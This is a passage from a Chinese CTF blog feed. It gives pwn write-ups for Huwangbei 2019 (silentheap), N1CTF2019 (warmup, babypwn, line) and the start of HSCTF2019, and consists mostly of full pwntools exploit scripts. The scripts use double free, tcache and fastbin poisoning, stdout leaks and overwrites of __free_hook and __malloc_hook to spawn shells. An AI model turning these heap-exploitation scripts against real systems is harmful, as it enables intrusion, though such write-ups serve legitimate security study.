class="number">0x40</span></span><br><span class="line">    fake_rel_off = fake_data_addr - rel_plt</span><br><span class="line">    fake_sym_off = (fake_data_addr + <span class="number">0x10</span> - symtab) / <span class="number">0x10</span></span><br><span class="line">    log.info(<span class="string">'fake sym off =&gt; '</span> + hex(fake_sym_off))</span><br><span class="line">    fake_str_off = (fake_data_addr+<span class="number">0xc</span>+<span class="number">0x10</span>-strtab)</span><br><span class="line">    binsh_addr = (fake_data_addr+<span class="number">0xc</span>+<span class="number">0x10</span>+<span class="number">0x7</span>)</span><br><span class="line">    <span class="comment">#set structs</span></span><br><span class="line">    fake_rel = p32(free_got) + p32((fake_sym_off&lt;&lt;<span class="number">8</span>)+<span class="number">7</span>)</span><br><span class="line">    fake_sym = p32(fake_str_off)+p32(<span class="number">0</span>)*<span class="number">2</span>+chr(<span class="number">0x12</span>)+chr(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line">    strings = <span class="string">"system\x00/bin/sh\x00\x00"</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    payload = p32(<span class="number">0</span>) + p32(resolve_plt) + p32(fake_rel_off)+<span class="string">"a"</span>*<span class="number">4</span>+p32(binsh_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x3c</span>,<span class="string">'a'</span>)</span><br><span class="line">    payload += p32(binsh_addr)</span><br><span class="line">    payload += fake_rel + <span class="string">'a'</span>*<span class="number">4</span> + fake_sym + strings</span><br><span class="line">    binsh_addr = <span class="number">0x0804ab20</span>+<span class="number">0x8</span></span><br><span class="line">    buf = p32(bss_1)+p32(p3_ret)+<span class="string">"/bin/sh\x00"</span>+p32(bss_1)+p32(<span class="number">0xf7dea000</span>+<span class="number">0xbf740</span>)+p32(<span class="number">0x08048406</span>)+p32(binsh_addr)+p32(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    s.send(buf)</span><br><span class="line">    s.sendline(<span class="string">"ls"</span>)</span><br><span class="line">    data = s.recv()</span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">and</span> <span class="string">"smashing"</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">        s.interactive()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = process(<span class="string">'./silentheap'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn(s)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            s.close()</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            s.close()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>护网杯2019</category>
      </categories>
  </entry>
  <entry>
    <title>N1CTF2019 部分pwn题解</title>
    <url>/2020/09/03/N1CTF2019/</url>
    <content><![CDATA[<h1 id="n1ctf2019部分pwn题解"><a href="#n1ctf2019部分pwn题解" class="headerlink" title="n1ctf2019部分pwn题解"></a>n1ctf2019部分pwn题解</h1><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>程序free的时候会把chunk_addr放到bss里，free(ptr)完毕清空list但是不清空ptr，因此会有double free，但只是针对当前块。edit是从chk_lis取地址进ptr，因此没有UAF。先double free，部分写分配到前面的heap修改size，由于libc版本是2.27，改完size后free8次得到ub。</p>
<p>由于只能固定分配0x50大小的chunk，我们先用double free改掉打算做overlapping chunk的size为0x41，再free的话放入tcache[0x40]，从而malloc(0x40)的时候不会用到这个块，构造overlapping chunk，让刚才tcache的fd写入main_arena+96，再部分写改成stdout，其size再改回0x51，最后用double free构造分配链到这个chunk，最终可以分配stdout，后面泄露地址，拿shell即可。</p>
<p><img src="/2020/09/03/N1CTF2019/1.jpg" alt="bins"></p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><p>关闭地址随机化的非爆破版</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./warmup'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./warmup'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"content&gt;&gt;"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"content&gt;&gt;"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="string">'0'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="string">'1'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="string">'2'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="string">'3'</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="string">'4'</span>)<span class="comment">#4</span></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="string">'\x60'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="string">'\x00'</span>)<span class="comment">#2 == initial 1</span></span><br><span class="line">    Add(p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>))<span class="comment">#6</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Edit(<span class="number">2</span>,<span class="string">'\xb0'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(<span class="string">'0'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>))<span class="comment">#1</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Add(<span class="string">'0'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="string">'3'</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>))</span><br><span class="line">    Edit(<span class="number">2</span>,<span class="string">'\x60\x07\xdd'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Add(<span class="string">'\xc0'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="string">'a'</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="string">'a'</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">    Add(p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)<span class="comment">#8</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p.recvn(<span class="number">0x20</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dcf780</span><span class="number">-0x7ffff79e4000</span>)</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Edit(<span class="number">4</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">    Add(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    Add(p64(libc.sym[<span class="string">'system'</span>]))<span class="comment">#8</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Throw的时候double free，由于程序只能add十次，需要用完清空，bss上有stdout,stdin,stderr，以stdin的’\x7f’为fake size构造fake chunk，部分写stderr(部分写stdout清空bss的时候会使得输出紊乱)。最后构造free链，分配到bss上stderr部分时第二次清空bss最终one_gadget覆写malloc_hook即可。(注意一旦free链形成之后我们可以清空其fd)</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./babypwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./babypwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(name,des_size,des,flag=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">        p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">'3.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Member name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"Description size:"</span>)</span><br><span class="line">    p.sendline(str(des_size))</span><br><span class="line">    p.recvuntil(<span class="string">"Description:"</span>)</span><br><span class="line">    p.send(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add1</span><span class="params">(name,des_size,des)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'3.Exit\n\n======================'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    p.sendline(str(des_size))</span><br><span class="line">    time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    p.send(des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Throw</span><span class="params">(index,flag=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">'3.Exit\n\n======================'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="string">'0'</span>,<span class="number">0x68</span>,<span class="string">'0'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="string">'1'</span>,<span class="number">0x68</span>,<span class="string">'1'</span>)<span class="comment">#1</span></span><br><span class="line">    Throw(<span class="number">0</span>)</span><br><span class="line">    Throw(<span class="number">1</span>)</span><br><span class="line">    Throw(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#fake stdout</span></span><br><span class="line"></span><br><span class="line">    fake_chunk = <span class="number">0x60201d</span></span><br><span class="line">    Add(<span class="string">'2'</span>,<span class="number">0x68</span>,p64(fake_chunk))<span class="comment">#2 == ini 0</span></span><br><span class="line">    Add(<span class="string">'3'</span>,<span class="number">0x68</span>,<span class="string">'3'</span>)</span><br><span class="line">    Add(<span class="string">'4'</span>,<span class="number">0x68</span>,<span class="string">'4'</span>)<span class="comment"># 4 == ini 0</span></span><br><span class="line">    Add(<span class="string">'5'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+<span class="string">'\xdd\x25'</span>)<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    p.sendline()</span><br><span class="line">    <span class="comment">#memeset the buf</span></span><br><span class="line">    fake_chunk = <span class="number">0x60203d</span></span><br><span class="line">    Throw(<span class="number">2</span>)</span><br><span class="line">    Throw(<span class="number">3</span>)</span><br><span class="line">    Throw(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="string">'6'</span>,<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line">    Add(<span class="string">'7'</span>,<span class="number">0x68</span>,<span class="string">'7'</span>)</span><br><span class="line">    Add(<span class="string">'8'</span>,<span class="number">0x68</span>,<span class="string">'8'</span>)</span><br><span class="line">    Add(<span class="string">'9'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(<span class="number">0x31</span>)+p64(<span class="number">0</span>)*<span class="number">10</span>)</span><br><span class="line">    Add(<span class="string">'0'</span>,<span class="number">0x68</span>,<span class="string">'0'</span>)</span><br><span class="line">    Add(<span class="string">'1'</span>,<span class="number">0x68</span>,<span class="string">'1'</span>)</span><br><span class="line">    Throw(<span class="number">0</span>)</span><br><span class="line">    Throw(<span class="number">1</span>)</span><br><span class="line">    Throw(<span class="number">0</span>)</span><br><span class="line">    fake_chunk = <span class="number">0x602030</span></span><br><span class="line">    <span class="comment">#memset the buf</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="string">'2'</span>,<span class="number">0x68</span>,p64(fake_chunk))</span><br><span class="line">    Add(<span class="string">'3'</span>,<span class="number">0x68</span>,<span class="string">'3'</span>)</span><br><span class="line">    Add(<span class="string">'4'</span>,<span class="number">0x68</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="string">'5'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x68</span>)<span class="comment">#0x602020</span></span><br><span class="line">    Add(<span class="string">'0'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#2 == 4</span></span><br><span class="line">    p.recvuntil(<span class="string">"\xff\x7f\x00\x00"</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    libc_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">    log.success(<span class="string">"libc addr =&gt; "</span> + hex(libc_addr))</span><br><span class="line">    libc_base = libc_addr - (<span class="number">0x7ffff7dd26a3</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#2 == 4</span></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Add(<span class="string">'1'</span>,<span class="number">0x68</span>,<span class="string">'1'</span>)</span><br><span class="line">    Add(<span class="string">'2'</span>,<span class="number">0x68</span>,<span class="string">'2'</span>)</span><br><span class="line">    Throw(<span class="number">1</span>)</span><br><span class="line">    Throw(<span class="number">2</span>)</span><br><span class="line">    Throw(<span class="number">1</span>)</span><br><span class="line">    Add(<span class="string">'3'</span>,<span class="number">0x68</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    Add(<span class="string">'4'</span>,<span class="number">0x68</span>,<span class="string">'4'</span>)</span><br><span class="line">    Add(<span class="string">'5'</span>,<span class="number">0x68</span>,<span class="string">'5'</span>)</span><br><span class="line">    Add(<span class="string">'6'</span>,<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(libc_base+gadgets[<span class="number">2</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Throw(<span class="number">3</span>)</span><br><span class="line">    Throw(<span class="number">3</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="line"><a href="#line" class="headerlink" title="line"></a>line</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这道题是很新颖的题目，自己做不出，看着Ex师傅的exp勉强懂了一点，这里记录一下大概思路，具体漏洞的产生请移步Ex师傅这里。<br><a href="http://blog.eonew.cn/archives/1210" target="_blank" rel="noopener">Ex</a></p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序维护了一个结构体列表，模拟排队，每次有新人进来之后用户输入ID，如果ID为负数或者队伍中已经有相同ID就退出，否则去看排队的人数，如果超过上限之后触发离队的逻辑，free掉分配的堆块。</p>
<p>forward_line是离队的逻辑函数，这里会将最先排队的人释放，释放调用people_quie，遍历people_list寻找目标ID，找到后free并将is_waiting置为false。</p>
<h3 id="程序漏洞"><a href="#程序漏洞" class="headerlink" title="程序漏洞"></a>程序漏洞</h3><p>程序源代码没有问题，问题出现在编译过程中，代码的指令集是AVX，优化过程导致lookup_people的逻辑出现问题，这个问题导致的结果是当我们添加相同ID的堆块的时候lookip_line的返回值绕过了判断逻辑(触发条件为第一个ID所在的index=0)，可以添加相同的堆块，进而在Free第一个ID的时候Free了两个块(1 &amp;&amp; 2)，再次Free这个ID的时候Free了(1)，即double free。</p>
<p>泄露libc可以申请8次大的chunk，得到ub，用malloc size = 1的块绕过memset的清空，得到libc_base，再用刚才的漏洞获取shell。</p>
<h3 id="Ex-py"><a href="#Ex-py" class="headerlink" title="Ex.py"></a>Ex.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">salt = os.getenv(<span class="string">'GDB_SALT'</span>) <span class="keyword">if</span> (os.getenv(<span class="string">'GDB_SALT'</span>)) <span class="keyword">else</span> <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clear</span><span class="params">(signum=None, stack=None)</span>:</span></span><br><span class="line">    print(<span class="string">'Strip  all debugging information'</span>)</span><br><span class="line">    os.system(</span><br><span class="line">        <span class="string">'rm -f /tmp/gdb_symbols&#123;&#125;* /tmp/gdb_pid&#123;&#125;* /tmp/gdb_script&#123;&#125;*'</span>.replace(<span class="string">'&#123;&#125;'</span>, salt))</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sig <span class="keyword">in</span> [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]:</span><br><span class="line">    signal.signal(sig, clear)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create a symbol file for GDB debugging</span></span><br><span class="line"><span class="comment"># try:</span></span><br><span class="line"><span class="comment">#     gdb_symbols = '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     '''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     f = open('/tmp/gdb_symbols&#123;&#125;.c'.replace('&#123;&#125;', salt), 'w')</span></span><br><span class="line"><span class="comment">#     f.write(gdb_symbols)</span></span><br><span class="line"><span class="comment">#     f.close()</span></span><br><span class="line"><span class="comment">#     os.system('gcc -g -shared /tmp/gdb_symbols&#123;&#125;.c -o /tmp/gdb_symbols&#123;&#125;.so'.replace('&#123;&#125;', salt))</span></span><br><span class="line"><span class="comment">#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols&#123;&#125;.c -o /tmp/gdb_symbols&#123;&#125;.so'.replace('&#123;&#125;', salt))</span></span><br><span class="line"><span class="comment"># except Exception as e:</span></span><br><span class="line"><span class="comment">#     print(e)</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch = 'i386'</span></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">execve_file = <span class="string">'./line'</span></span><br><span class="line"><span class="comment"># sh = process(execve_file, env=&#123;'LD_PRELOAD': '/tmp/gdb_symbols&#123;&#125;.so'.replace('&#123;&#125;', salt)&#125;)</span></span><br><span class="line">sh = process(execve_file)</span><br><span class="line"><span class="comment"># sh = remote('', 0)</span></span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"><span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create temporary files for GDB debugging</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    gdbscript = <span class="string">'''</span></span><br><span class="line"><span class="string">    define pr</span></span><br><span class="line"><span class="string">        x/8wx $rebase(0x202140)</span></span><br><span class="line"><span class="string">        end</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_pid&#123;&#125;'</span>.replace(<span class="string">'&#123;&#125;'</span>, salt), <span class="string">'w'</span>)</span><br><span class="line">    f.write(str(proc.pidof(sh)[<span class="number">0</span>]))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    f = open(<span class="string">'/tmp/gdb_script&#123;&#125;'</span>.replace(<span class="string">'&#123;&#125;'</span>, salt), <span class="string">'w'</span>)</span><br><span class="line">    f.write(gdbscript)</span><br><span class="line">    f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">New</span><span class="params">(id, size, content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'ID: '</span>, str(id))</span><br><span class="line">    sh.sendlineafter(<span class="string">'SIZE: '</span>, str(size))</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    New(i + <span class="number">1</span>, <span class="number">0xf8</span>, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    New(i + <span class="number">0x10</span>, <span class="number">0x28</span>, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">New(<span class="number">0x100</span>, <span class="number">1</span>, <span class="string">'\xa0'</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">'8 : 256 ('</span>)</span><br><span class="line">result = sh.recvuntil(<span class="string">')'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">main_arena_addr = u64(result.ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - <span class="number">0x160</span></span><br><span class="line">log.success(<span class="string">'main_arena_addr: '</span> + hex(main_arena_addr))</span><br><span class="line"></span><br><span class="line">libc_addr = main_arena_addr - (libc.symbols[<span class="string">'__malloc_hook'</span>] + <span class="number">0x10</span>)</span><br><span class="line">log.success(<span class="string">'libc_addr: '</span> + hex(libc_addr))</span><br><span class="line"></span><br><span class="line">New(<span class="number">0x100</span>, <span class="number">1</span>, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0x20</span> + i == <span class="number">0x23</span>):</span><br><span class="line">        New(<span class="number">0x20</span> + i, <span class="number">0x38</span>, <span class="string">'/bin/sh\0'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        New(<span class="number">0x20</span> + i, <span class="number">0x38</span>, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">New(<span class="number">0x101</span>, <span class="number">0x38</span>, <span class="string">'\n'</span>)</span><br><span class="line">New(<span class="number">0x102</span>, <span class="number">0x18</span>, p64(libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">New(<span class="number">0x103</span>, <span class="number">0x18</span>, <span class="string">'\n'</span>)</span><br><span class="line">New(<span class="number">0x104</span>, <span class="number">0x18</span>, p64(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">sh.sendlineafter(<span class="string">'choice: '</span>, <span class="string">'1'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'ID: '</span>, str(<span class="number">0x105</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://blog.eonew.cn/archives/1210#line" target="_blank" rel="noopener">Ex师傅</a></p>
]]></content>
      <categories>
        <category>N1CTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>HSCTF2019</title>
    <url>/2020/09/03/HSCTF2019/</url>
    <content><![CDATA[<h1 id="HSCTF2019"><a href="#HSCTF2019" class="headerlink" title="HSCTF2019"></a>HSCTF2019</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>emm在ctftime上第一次见到简单的比赛题，后来才知道是High School CTF。不过做了所有的pwn，还是记录一下，最后一个题要总结一下。</p>
<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>nc addr 即可</p>
<h2 id="return-to-sender"><a href="#return-to-sender" class="headerlink" title="return to sender"></a>return to sender</h2><p>最简单的栈溢出，system(“/bin/sh”)给了，直接return过去</p>
